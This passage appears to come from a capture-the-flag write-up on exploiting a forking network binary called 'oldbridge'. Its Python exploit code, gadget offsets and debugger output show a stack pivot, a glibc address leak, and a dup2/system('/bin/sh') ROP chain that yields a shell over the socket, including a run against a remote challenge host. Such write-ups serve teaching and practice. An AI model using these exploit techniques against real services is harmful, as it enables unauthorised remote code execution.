 b59:   48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
 b5d:   64 48 33 04 25 28 00    xor    rax,QWORD PTR fs:0x28
 b64:   00 00
 b66:   74 05                   je     b6d &lt;helper+0x33&gt;
 b68:   e8 b3 fd ff ff          call   920 &lt;__stack_chk_fail@plt&gt;  
 b6d:   c9                      leave
 b6e:   c3                      ret

Disassembly of section .fini:
</code></pre></div><p>The key here are the instructions <code>leave; ret</code> at offset <code>0xb6d</code>. Those instructions form a gadget that allows us to set the stack pointer to the same value as <code>$rbp</code> since <code>leave</code> is the same as <code>mov rbp, rsp; pop rbp</code>. And then the <code>ret</code> will bring us to the address pointed by <code>$rbp</code>, which we can control.</p><p>The strategy is to enter the ROP chain in the junk section of the payload and set <code>$rbp</code> to that point.</p><p>Let&rsquo;s run the exploit with GDB attached and then find out where is <code>$rbp</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">oldbridge</span>
Reading symbols from <span class="code-dark-green">oldbridge</span>...
(No debugging symbols found in <span class="code-dark-green">oldbridge</span>)  
<span class="code-red">gef➤</span>  run 1234
Starting program: ./oldbridge 1234
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b'\r\xb0\xff#\x10%\xbb\x10'
[<span class="code-green">+</span>] XOR saved $rbp: b'\xcd\xeb\xf2\xf2\xf2r\r\r'  
[<span class="code-green">+</span>] XOR return address: b'\xc2\x03MXXX\r\r'
[<span class="code-green">+</span>] Canary: 0x1db6281d2ef2bd00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffffffe6c0
[<span class="code-green">+</span>] Return address: 0x555555400ecf
[<span class="code-green">+</span>] ELF base address: 0x555555400000
</code></pre></div><p>Alright, we have <code>0x7fffffffe6c0</code> as the value of the saved <code>$rbp</code>. Let&rsquo;s set a breakpoint in the debugger and run the exploit again to check more things:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[Detaching after fork from child process 139491]
^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ee3107</span> in <span class="code-dark-yellow">__libc_accept</span> (<span class="code-dark-cyan">fd</span>=0x3, <span class="code-dark-cyan">addr</span>=..., <span class="code-dark-cyan">len</span>=0x7fffffffe678) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/accept.c</span>:26  
26      ../sysdeps/unix/sysv/linux/accept.c: No such file or directory.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  set follow-fork-mode child  
<span class="code-green">gef➤</span>  break *check_username+95
Breakpoint 1 at <span class="code-dark-blue">0x555555400bce</span>
<span class="code-green">gef➤</span>  continue
Continuing.
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234  
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-blue">...../..</span>] XOR Canary: b'\r\x00'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[Attaching after process 133185 fork to child process 143736]
[New inferior 2 (process 143736)]
[Detaching after fork from parent process 133185]
[Inferior 1 (process 133185) detached]
[Switching to process 143736]

Thread 2.1 "oldbridge" hit Breakpoint 1, <span class="code-dark-blue">0x0000555555400bce</span> in <span class="code-dark-yellow">check_username</span> ()  
</code></pre></div><p>Let&rsquo;s print the contents of <code>$rbp</code> at this point (right after the <code>read</code> call):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rbp
$1 = 0x7fffffffe650
<span class="code-green">gef➤</span>  x/gx 0x7fffffffe650
<span class="code-dark-blue">0x7fffffffe650</span>: 0x00007fffffffe6c0  
</code></pre></div><p>We see that <code>$rbp</code> contains an address (<code>0x7fffffffe650</code>), and inside this address we find our extracted value (<code>0x00007fffffffe6c0</code>). They differ in <code>0x70</code>.</p><p>Now let&rsquo;s find the stack address where our payload begins (we can search for <code>davide</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  grep davide
<span class="code-blue">[+]</span> Searching '<span class="code-dark-yellow">davide</span>' in memory
<span class="code-green">[+]</span> In '<span class="code-dark-blue">[stack]</span>'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe240 - 0x7fffffffe277  →   "<span class="code-dark-magenta">davideAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]</span>"  
</code></pre></div><p>And the distance between our payload and the address stored in <code>$rbp</code> is <code>0x410</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤</span>  p/x $rbp - 0x7fffffffe240  
$2 = 0x410
</code></pre></div><p>Now, the idea is to set <code>$rbp</code> to point to this address plus <code>0x70</code> and minus <code>0x8</code> to prevent stack alignment issues.</p><p>For the moment, we will recycle the previous ROP chain to see if it works. But it doesn&rsquo;t. Maybe it&rsquo;s because of using <code>printf</code>. Instead, we can use <code>write</code>, which needs two arguments (the file descriptor to write to, and the address of the string to write). The second argument will go in <code>$rsi</code>, so we need another gadget, and also the address of <code>write</code> at the PLT:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'pop rsi'</span>
0x0000000000000f71 : <span class="code-red">pop rsi</span> ; pop r15 ; ret

<span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">oldbridge</span> | <span class="code-dark-green">grep</span> write
0000000000000910 &lt;<span class="code-red">write</span>@plt&gt;:
 910:   ff 25 0a 17 20 00       jmpq   *0x20170a(%rip)        # 202020 &lt;<span class="code-red">write</span>@GLIBC_2.2.5&gt;  
 bad:   e8 5e fd ff ff          callq  910 &lt;<span class="code-red">write</span>@plt&gt;
 ee4:   e8 27 fa ff ff          callq  910 &lt;<span class="code-red">write</span>@plt&gt;
</code></pre></div><p>Now this is the payload for the ROP chain, including the Stack Pivot technique:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">pop_rdi_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f73</span>
    <span class="mtk1">pop_rsi_pop_r15_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">f71</span>
    <span class="mtk1">leave_ret_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6d</span>

    <span class="mtk1">printf_got</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">202038</span>
    <span class="mtk1">write_plt</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">910</span>
    <span class="mtk1">check_username_addr</span> <span class="mtk5">=</span> <span class="mtk1">elf_base_addr</span> <span class="mtk5">+</span> <span class="mtk7 mtki">0x</span><span class="mtk6">b6f</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">username</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">))</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">1</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rsi_pop_r15_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">printf_got</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">write_plt</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">check_username_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>  
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">saved_rbp</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">478</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">leave_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>Notice that <code>0x478</code> is <code>0x410</code> plus <code>0x70</code> and minus <code>0x8</code>, as said before.</p><h3 id="leaking-glibc-addresses">Leaking Glibc addresses</h3><p>If we execute it, we find that it gets called, and prints some raw bytes (not visible) and <code>Username:</code> right after, meaning that we printed the bytes of an address and executed <code>check_username</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive  
<span class="code-red">$</span>
[<span class="code-blue">*</span>] Interrupted
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./oldbridge</span> 1234
*** stack smashing detected ***: terminated  
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
*** stack smashing detected ***: terminated
...
Username found!
Username found!
Username found!
...
Username found!
KUsername:
</code></pre></div><p>In order to obtain the leak in our side, we must change the file descriptor (<code>1</code> was for <code>stdout</code>, just for testing purposes). Socket file descriptors usually are above <code>3</code>. We can try until we find the correct one.</p><p>Locally, it is <code>4</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000  
[<span class="code-blue">*</span>] Switching to interactive mode
\x90\x00\x84K\x7fUsername: <span class="code-red">$</span>
[<span class="code-blue">*</span>] Interrupted
</code></pre></div><p>And there we have the leak to bypass ASLR in Glibc. We can now take it and compute the base address of Glibc (again, locally):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">oldbridge</span>
        linux-vdso.so.1 (0x00007ffc43fd4000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcf014d5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fcf018de000)

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">' write'</span>
   900: 00000000001144a0   153 FUNC    WEAK   DEFAULT   15 <span class="code-red">write</span>v@@GLIBC_2.2.5  
  2281: 000000000010e090   153 FUNC    WEAK   DEFAULT   15 <span class="code-red">write</span>@@GLIBC_2.2.5
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>

    <span class="mtk1">write_addr</span> <span class="mtk5">=</span> <span class="mtk1">u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">rstrip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>  
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked</span> <span class="mtk4">write()</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">write_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

    <span class="mtk1">write_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">10e090</span>
    <span class="mtk1">glibc_base_addr</span> <span class="mtk5">=</span> <span class="mtk1">write_addr</span> <span class="mtk5">-</span> <span class="mtk1">write_offset</span>
    <span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc</span> <span class="mtk4">base</span> <span class="mtk4">address:</span> <span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-green">+</span>] Leaked write() address: 0x7f4b84af0090
[<span class="code-green">+</span>] Glibc base address: 0x7f4b849e2000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1234  
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>Everything correct. Now, in order to get an interactive shell, we need to use the socket connection. We can&rsquo;t use a reverse shell because the remote instance does not have Internet access.</p><p>Hence, we will be calling <code>dup2</code> to duplicate the file descriptor of the socket (<code>4</code>) for <code>stdin</code> (<code>0</code>), <code>stdout</code> (<code>1</code>) and <code>stderr</code> (<code>2</code>). Finally, we will call <code>system("/bin/sh")</code> to get an interactive shell over the socket connection.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> dup2
   627: 000000000010e8f0    37 FUNC    GLOBAL DEFAULT   15 __<span class="code-red">dup2</span>@@GLIBC_2.2.5
  1017: 000000000010e8f0    37 FUNC    WEAK   DEFAULT   15 <span class="code-red">dup2</span>@@GLIBC_2.2.5

<span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> system
   237: 0000000000153a00   103 FUNC    GLOBAL DEFAULT   15 svcerr_<span class="code-red">system</span>err@@GLIBC_2.2.5  
   619: 00000000000522c0    45 FUNC    GLOBAL DEFAULT   15 __libc_<span class="code-red">system</span>@@GLIBC_PRIVATE
  1430: 00000000000522c0    45 FUNC    WEAK   DEFAULT   15 <span class="code-red">system</span>@@GLIBC_2.2.5

<span class="code-cyan">$</span> <span class="code-dark-green">strings</span> -atx <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> | <span class="code-dark-green">grep</span> /bin/sh
 1b45bd <span class="code-red">/bin/sh</span>
</code></pre></div><p>We can use a loop to duplicate the file descriptors more easily:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">    <span class="mtk1">dup2_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">10e8f0</span>
    <span class="mtk1">system_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">522c0</span>
    <span class="mtk1">bin_sh_offset</span> <span class="mtk5">=</span> <span class="mtk7 mtki">0x</span><span class="mtk6">1b45bd</span>

    <span class="mtk1">dup2_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">dup2_offset</span>
    <span class="mtk1">system_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">system_offset</span>
    <span class="mtk1">bin_sh_addr</span> <span class="mtk5">=</span> <span class="mtk1">glibc_base_addr</span> <span class="mtk5">+</span> <span class="mtk1">bin_sh_offset</span>

    <span class="mtk1">payload</span>  <span class="mtk5">=</span> <span class="mtk1">username</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">))</span>

    <span class="mtk5">for</span> <span class="mtk1">fd</span> <span class="mtk5">in</span> <span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">]:</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(socket_fd),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rsi_pop_r15_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">fd</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk6">0</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
        <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">dup2_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">system_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'A'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk1">offset</span> <span class="mtk5">+</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">username</span><span class="mtk1">)</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>  
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">xor_canary</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">saved_rbp</span> <span class="mtk5">-</span> <span class="mtk7 mtki">0x</span><span class="mtk6">478</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>
    <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk8">xor</span><span class="mtk1">(p64(</span><span class="mtk1">leave_ret_addr</span><span class="mtk1">),</span> <span class="mtk1">key</span><span class="mtk1">)</span>

    <span class="mtk1">p</span> <span class="mtk5">=</span> <span class="mtk8">get_process</span><span class="mtk1">()</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Username:</span> <span class="mtk4">'</span><span class="mtk1">,</span> <span class="mtk1">payload</span><span class="mtk1">)</span>
    <span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>And we manage to get a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1234
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] Canary: 0x6f575195cffba600
[<span class="code-green">+</span>] Saved $rbp: 0x7ffe877c9aa0
[<span class="code-green">+</span>] Return address: 0x55e20e000ecf
[<span class="code-green">+</span>] ELF base address: 0x55e20e000000
[<span class="code-green">+</span>] Leaked write() address: 0x7f4b84af0090
[<span class="code-green">+</span>] Glibc base address: 0x7f4b849e2000
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1234  
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
oldbridge
solve.py
</code></pre></div><p>Now we need to run it remotely and find the correct version of Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 167.71.139.192:31230
[<span class="code-blue">*</span>] './oldbridge'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
[<span class="code-green">+</span>] XOR Canary: b"\r\x82\xee\x8dl'P\x8f"
[<span class="code-green">+</span>] XOR saved $rbp: b'\x1d>\xa8\xde\xf2r\r\r'
[<span class="code-green">+</span>] XOR return address: b'\xc2\xa3uE\xb3X\r\r'
[<span class="code-green">+</span>] Canary: 0x825d2a6180e38f00
[<span class="code-green">+</span>] Saved $rbp: 0x7fffd3a53310
[<span class="code-green">+</span>] Return address: 0x55be4878aecf
[<span class="code-green">+</span>] ELF base address: 0x55be4878a000
